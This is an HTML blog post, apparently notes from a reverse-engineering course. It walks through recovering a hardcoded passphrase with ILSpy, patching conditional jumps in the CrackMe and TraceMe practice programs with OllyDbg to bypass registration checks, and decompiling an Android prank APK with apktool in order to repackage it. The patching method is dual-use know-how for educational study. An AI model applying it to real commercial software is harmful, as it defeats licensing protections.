
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>软件APP逆向 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">2.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0%EF%BC%9A%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91"><span class="toc-number">3.</span> <span class="toc-text">0：一次简单的程序逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E7%9A%84"><span class="toc-number">3.1.</span> <span class="toc-text">目的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AE%B9"><span class="toc-number">3.2.</span> <span class="toc-text">内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">3.3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.4.</span> <span class="toc-text">步骤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1%EF%BC%9A%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3%E5%85%A5%E9%97%A8-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3CrackMe"><span class="toc-number">4.</span> <span class="toc-text">1：软件破解入门(暴力破解CrackMe)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">4.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">4.2.</span> <span class="toc-text">步骤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%EF%BC%9AOllyDbg%E5%AE%9E%E7%8E%B0TraceMe%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91"><span class="toc-number">5.</span> <span class="toc-text">2：OllyDbg实现TraceMe软件逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-1"><span class="toc-number">5.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-2"><span class="toc-number">5.2.</span> <span class="toc-text">步骤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3%EF%BC%9A%E5%9F%BA%E4%BA%8Eapktool%E7%9A%84%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%B6%E4%BD%9C"><span class="toc-number">6.</span> <span class="toc-text">3：基于apktool的病毒分析与制作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-2"><span class="toc-number">6.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7-1"><span class="toc-number">6.2.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-3"><span class="toc-number">6.3.</span> <span class="toc-text">步骤</span></a></li></ol></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>软件APP逆向</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/11/14
        </span>
        
        <span class="category">
            <a href="/blog/categories/Rev/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Rev
            </a>
        </span>
        
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">3.3k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">13分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>某逆向实训记录</p>
<span id="more"></span>

<hr>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>PEiD：一款著名的查壳工具，其功能强大，几乎可以侦测出所有的壳，其数量已超过470种PE文档的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8A%A0%E5%A3%B3/146523">加壳</a>类型和签名。内置有差错控制的技术，所以一般能确保扫描结果的准确性。前两种扫描模式几乎在瞬间就可得到结果，核心扫描较慢</p>
<p>ILspy：一个开源的 .net 反编译软件，使用十分方便。支持C#和vb：可以将一个 .dll 文件转换为C#或VB语言。支持保存文件：对于单个文件可以保存为 .cs 文件或 .vb 文件，当文件较多时，可以选择保存为项目文件。支持C#的反编译：C#语句可被反编译出来，并可支持yield return 语句和 lambda 表达式的反编译。</p>
<p>OllyDbg：一种具有可视化界面的32位汇编分析调试器，是一个新的动态追踪工具，将 IDA 与 SoftICE 结合起来的思想，Ring3级调试器，非常容易上手，已代替SoftICE成为当今最为流行的调试解密工具了。同时还支持插件扩展功能，是目前最强大的调试工具。中文版界面清晰，易于操作。</p>
<hr>
<h1 id="0：一次简单的程序逆向"><a href="#0：一次简单的程序逆向" class="headerlink" title="0：一次简单的程序逆向"></a>0：一次简单的程序逆向</h1><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>通过逆向分析小程序，复现小程序的源代码从而破解小程序</p>
<h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><ol>
<li>查壳</li>
<li>反编译</li>
<li>复现源代码</li>
<li>查看正确的通关密钥</li>
</ol>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
<li><p>先运行程序，看看程序的本质是什么，干什么</p>
</li>
<li><p>PEiD 看程序是什么类型，辨别是什么语言编写的，然后选择合适的工具分析</p>
</li>
<li><p>通过 PEiD 辨别出是什么语言编写的，就可以运用相应的工具去分析；比如 dotnet 可以使用 ILSpy，c&#x2F;c++，win 分析和 IDApro 静态分析，根据程序的复杂度选择合适的工具分析</p>
</li>
<li><p>通过关键字快速寻找flag</p>
</li>
<li><p>程序断点动态分析或者静态分析算法最终完成逆向得到flag</p>
</li>
</ol>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
<li><p>下载所需破解的小程序（这里以 ald阿拉丁神灯 为例），测试通关密语</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114123336268.png" alt="image-20241114123336268"></p>
</li>
<li><p>利用查壳工具查看ald的编译语言（PEiD）：</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114123513990.png" alt="image-20241114123513990"></p>
<p>可以看到是 C# 编译的，所以我们可以用 iLSpy 来查看源代码</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114124047136.png" alt="image-20241114124047136"></p>
<p>观察源码结构，从刚才测试 ald 程序的过程中可知当我们按下按钮时会判断密语正确与否</p>
<p>那么先查看上面的 Button1_Click 源码</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114124414678.png" alt="image-20241114124414678"></p>
<p>这里与明文密语比较进行判断，那么可知密语为：zhimakaimen@2011</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114124529946.png" alt="image-20241114124529946"></p>
</li>
</ol>
<hr>
<h1 id="1：软件破解入门-暴力破解CrackMe"><a href="#1：软件破解入门-暴力破解CrackMe" class="headerlink" title="1：软件破解入门(暴力破解CrackMe)"></a>1：软件破解入门(暴力破解CrackMe)</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>所谓暴力破解，就是通过修改汇编代码进而控制程序的运行流程，达到不需注册码也能正常使用软件的目的</p>
<h2 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h2><ol>
<li><p>以《加密与解密》中的CFF CrackMe #3程序为例</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114141119248.png" alt="image-20241114141119248"></p>
<p>是一个注册机</p>
</li>
<li><p>查壳</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114135130256.png" alt="image-20241114135130256"></p>
<p>用 Delphi 写的，无壳</p>
</li>
<li><p>OllyDbg 载入此程序，使用的是W32Dasm，属于静态反汇编软件，支持WIN API，具有强大的串式参考功能</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114135658544.png" alt="image-20241114135658544"></p>
<p>在反汇编窗口 “右键——查找——所有参考文本字符串”</p>
<p>再右键查找文本</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114140735055.png" alt="image-20241114140735055"></p>
<p>这里查找整个范围下的 Wrong 字符串</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114141216323.png" alt="image-20241114141216323"></p>
</li>
</ol>
<p>找到 Wrong Serial,try again! ，右键——反汇编窗口中跟随</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114142801639.png" alt="image-20241114142801639"></p>
<p>分析程序流程：</p>
<p>输入ID和注册码后，</p>
<p>00440F34 处的 call 调用子函数来判断ID是否为 Registered User（00440F34处，call 00403B2C处的子函数）</p>
<p>如果不正确，一个 jnz 跳到 00440F8C，弹出 &quot;Wrong Serial, try again!&quot;</p>
<p>00440F51 处的 call 调用子函数来判断注册码是否为 GFX-754-IER-954（00440F51处，call 00403B2C处的子函数）</p>
<p>如果不正确，一个 jnz 跳到 00440F72 ，弹出 &quot;Wrong Serial, try again!&quot;</p>
<p>所以正确的ID和注册码是这里硬编码的Registered User : GFX-754-IER-954</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114153726506.png" alt="image-20241114153726506"></p>
<br>

<p>不过我们这里要学习的是暴力破解</p>
<p>现在在任意一个 call 00403B2C 前面 f2 下个断点，看看 call 了个什么函数，这里选择在验证 id 的部分下断点</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114143724315.png" alt="image-20241114143724315"></p>
<p>f9 调试程序，随便输入一个错误的id：test 和错误的注册码：123-456-789，按下注册</p>
<p>跟进，直到 00440F34 的 call 指令，f7 单步步入检验函数（此函数地址在 00403B2C）</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114154222304.png" alt="image-20241114154222304"></p>
<p>可以观察到 eax 存储了我们的 id，edx 存储了正确的 id</p>
<p>在 00403B33 会进行 cmp 比较</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114145541524.png" alt="image-20241114145541524"></p>
<p>从代码中可以发现，程序将输入的注册码与内置的注册码用cmp指令做了比较。（cmp 指令执行后，将对标志寄存器 ZF 产生影响。比如 CMP AX , BX ，当AX&#x3D;BX时，ZF&#x3D;1；AX!&#x3D;BX时，ZF&#x3D;0。）</p>
<p>也就是说，如果注册码与输入的字符串不相等，ZF&#x3D;0。此时子程序返回，执行 00440F39 处的 JNZ 指令。因为输入的注册码不对，ZF&#x3D;0，开始执行 JNZ，跳转到 00440F8C，弹出 Wrong Serial 对话框提示注册码错误。</p>
<p>这就是“关键跳”，如果将 JNZ（ZF&#x3D;0时就跳转）改为 JE（ZF&#x3D;1时就跳转），得到的结果就会正好相反，即错误的注册码反而会提示注册成功，对的注册码反而会提示错误</p>
<p>那么现在找出那两个“关键跳”（输入ID时call了一下，然后一个jnz。输入注册码时又call了一下，再一个jnz。），</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114150533633.png" alt="image-20241114150533633"></p>
<p>接下来修改汇编代码，双击对应的 JNZ 指令，弹出“汇编于此处”的对话框。将只需将 jnz 改为 je ，点击“汇编”即可。用同样的方法修改另一处 jnz</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114150700806.png" alt="image-20241114150700806"></p>
<p>修改完毕，右键——复制到可执行文件——所有修改</p>
<p>接下来 f9 再次执行，随便输入账号和许可即可返回注册成功</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114151118981.png" alt="image-20241114151118981"></p>
<hr>
<h1 id="2：OllyDbg实现TraceMe软件逆向"><a href="#2：OllyDbg实现TraceMe软件逆向" class="headerlink" title="2：OllyDbg实现TraceMe软件逆向"></a>2：OllyDbg实现TraceMe软件逆向</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><p>本实验采用软件 OllyDbg 对软件进行爆破，TraceMe 是一个用于逆向工程研究的 exe 可执行文件，双击打开它会出现一个需要输入用户名与密码的界面，正确的用户名与密码只有一个，只有当输入的用户名与密码正确时才会显示成功，本实验使用 OllyDbg 分析其源码，找到关键跳转的代码，并进行爆破，达到输入什么用户名与密码都会显示成功的目的，并且导出为可执行文件。</p>
<h2 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤"></a>步骤</h2><ol>
<li><p>运行TraceMe</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114171522596.png" alt="image-20241114171522596"></p>
</li>
<li><p>查壳</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114172154997.png" alt="image-20241114172154997"></p>
<p>无壳，是 c++ 写的</p>
</li>
<li><p>Ollydbg打开 TraceMe 进行调试</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114172010551.png" alt="image-20241114172010551"></p>
<p>刚打开时发现光标停在004013A0处，此处为程序的入口点（EntryPoint）</p>
</li>
<li><p>前面观察到这个程序有两个输入框，有输入的话程序必然要从输入框中读取字符，而读取字符通常使用使用的 API 是 GetDlgItemText 或者 GetWindowText 函数，也可以发送消息直接获取文本框中的文本</p>
<p>不过一般情况下，我们是没有办法直接知道程序用了什么函数来处理字符，多多尝试</p>
<p>快捷键 Ctrl+G，可以打开一个跟随表达式窗口，如图，输入 GetDlgItemTextA ，回车跳转（PS：OD对大小写敏感）</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114172622969.png" alt="image-20241114172622969"></p>
<p>跳转至 75207A60，GetDlgItemTextA 函数的入口点，f2下断点</p>
</li>
<li><p>f9运行程序，输入数据check</p>
<p>它会断在我们刚才下断点的地方，之后f8单步执行，刚才下断点的地方要执行经过两次，因为我们的程序有两个输入框，可以直接ctrl+f9 运行到函数内的 return</p>
<p>一般API函数都服从 __stdcall 调用约定，即函数入口参数按从左到右的顺序入栈，由被调用者清理栈中的参数，返回值放在 eax 寄存器中</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114173311060.png" alt="image-20241114173311060"></p>
<p>此时我们的用户名和序列号分别在 edx 和 eax 寄存器中</p>
<p>继续向下执行，可以看到这里有一个判断<code>test eax,eax</code>，判断 eax 是否 &#x3D; 0</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114174622928.png" alt="image-20241114174622928"></p>
<p>eax&#x3D;0表示注册失败，eax&#x3D;1表示注册成功，下面的跳转语句，若不跳转表示成功</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114174719894.png" alt="image-20241114174719894"></p>
</li>
<li><p>所以，我们可以让其跳转失效，有两种方法，第一种是将标志寄存器 zf 标志位由1变为0就可以了，但是这种方法有个问题就是没有办法保存，下次运行就会失效，第二种方法是将跳转语句用 nop 指令填充，然后保存</p>
<p>这里采用第二种方法，右键将<code>je short TraceMe.0040122E</code> nop掉</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114175205537.png" alt="image-20241114175205537"></p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114175242047.png" alt="image-20241114175242047"></p>
<p>右键选择复制到可执行文件&#x3D;&#x3D;&gt;所有修改</p>
<p>在弹出的窗口中鼠标右键后选择保存文件</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114175344126.png" alt="image-20241114175344126"></p>
<p>这边调试继续运行能获得成功的回显</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114175458187.png" alt="image-20241114175458187"></p>
<p>刚才保存的程序也能正常运行并成功回显</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114175546469.png" alt="image-20241114175546469"></p>
</li>
</ol>
<hr>
<h1 id="3：基于apktool的病毒分析与制作"><a href="#3：基于apktool的病毒分析与制作" class="headerlink" title="3：基于apktool的病毒分析与制作"></a>3：基于apktool的病毒分析与制作</h1><h2 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h2><p>熟悉对病毒的逆向工程，也熟悉逆向工程相关工具的使用，最后通过逆向工程实现对病毒的分析以及重新制作新的病毒</p>
<h2 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h2><ol>
<li>apktool：可以反编译软件的布局文件、图片等资源。</li>
<li>dex2jar：将apk反编译成java源码（classes.dex 转化成 jar 文件）</li>
<li>jd-gui：查看APK中classes.dex转化成出的jar文件，即源码文件。</li>
</ol>
<h2 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤"></a>步骤</h2><ol>
<li><p>将后缀改为.zip文件并做简单分析，apk 和 jar 包一样，都可以被解压</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114191511160.png" alt="image-20241114191511160"></p>
<p>可以看到 assets 下有一个音频文件和2个 .lua 文件</p>
</li>
<li><p>使用apktool进行反编译</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> apktool_2.10.0.jar  d 一份礼物.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114203203147.png" alt="image-20241114203203147"></p>
<p>文件结构：</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114203858896.png" alt="image-20241114203858896"></p>
<ul>
<li><p>assets：存放资源文件，包含Lua脚本lua和音频文件mp3</p>
</li>
<li><p>lib：本地库（Native Library）文件夹，包含编译后的本地代码（Native Code）的so文件</p>
</li>
<li><p>smail：存放smail文件，包含Dalvik字节码，是对App的Java代码反向成中立字节码的结果</p>
</li>
<li><p>AndroidManifest.xml：包含App的信息，App名为送给最好的TA，包名为 com.sgzh.dt</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> <span class="token attr-name"><span class="token namespace">android:</span>configChanges</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>keyboardHidden|orientation|screenSize<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">android:</span>label</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>送给最好的TA<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.androlua.LuaActivity<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">android:</span>theme</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>@style/app_theme<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intent-filter</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>action</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>android.intent.action.VIEW<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>category</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>android.intent.category.DEFAULT<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>category</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>android.intent.category.BROWSABLE<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>data</span> <span class="token attr-name"><span class="token namespace">android:</span>scheme</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>androlua<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>data</span> <span class="token attr-name"><span class="token namespace">android:</span>host</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.sgzh.dt<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<p>将文件夹里的音频文件替换</p>
<p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114201007640.png" alt="image-20241114201007640"></p>
</li>
